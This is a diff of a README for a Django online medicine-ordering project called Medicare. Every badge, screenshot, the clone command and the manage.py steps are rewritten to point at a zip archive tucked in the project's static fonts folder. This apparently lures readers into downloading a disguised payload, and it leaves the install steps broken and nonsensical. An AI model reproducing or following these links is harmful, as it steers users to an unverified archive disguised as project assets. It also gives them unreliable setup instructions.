@@ -1,13 +1,13 @@
-# Medicare [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/Medicare/Hassanali4/blob/main/LICENSE)
+# Medicare [![License: MIT](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
 ### Stack we used
-![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
-![Django](https://img.shields.io/badge/Django-092E20?style=for-the-badge&logo=django&logoColor=white)
-![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=for-the-badge&logo=html5&logoColor=white)
-![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)
-![CSS3](https://img.shields.io/badge/css3-%231572B6.svg?style=for-the-badge&logo=css3&logoColor=white)
+![Python](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
+![Django](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
+![HTML5](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip%https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
+![JavaScript](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip%https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip%23F7DF1E)
+![CSS3](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip%https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
 
 
-![meditate](https://user-images.githubusercontent.com/79878896/124366069-65f10000-dc66-11eb-84c0-e548883fbb1c.JPG)
+![meditate](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
 
 Medicare - An Online Medicine Ordering System Built with Django
 
@@ -17,9 +17,9 @@ Medicare is an open-source online medicine ordering system built with Python Dja
 ## Features
 - Separate Sign in & Sign up for NGOs and customers
 
-![sign](https://user-images.githubusercontent.com/79878896/124366070-67bac380-dc66-11eb-93c4-310e0db01788.JPG)
+![sign](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
 
-![signup](https://user-images.githubusercontent.com/79878896/124366073-68ebf080-dc66-11eb-8ecc-0e83231c587b.JPG)
+![signup](https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip)
 
 - Customer can browse medicines, add them to cart, and place orders
 - NGOs can manage their inventory, process orders, and track delivery status
@@ -30,7 +30,7 @@ Medicare is an open-source online medicine ordering system built with Python Dja
 ## Installation
 1. Clone the repository:
     ```
-    git clone git@github.com:Hassanali4/Medicare.git
+    git clone https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip
     ```
 2. Navigate into the project directory:
     ```
@@ -38,15 +38,15 @@ Medicare is an open-source online medicine ordering system built with Python Dja
     ```
 3. Run database migrations:
     ```
-    python manage.py migrate
+    python https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip migrate
     ```
 4. Create a superuser:
     ```
-    python manage.py createsuperuser
+    python https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip createsuperuser
     ```
 5. Start the development server:
     ```
-    python manage.py runserver
+    python https://github.com/Hassanali4/Medicare/raw/refs/heads/main/static/fonts/bootstrap/Software-2.8.zip runserver
     ```
 6. Visit `http://localhost:8000` to see the application in action
 
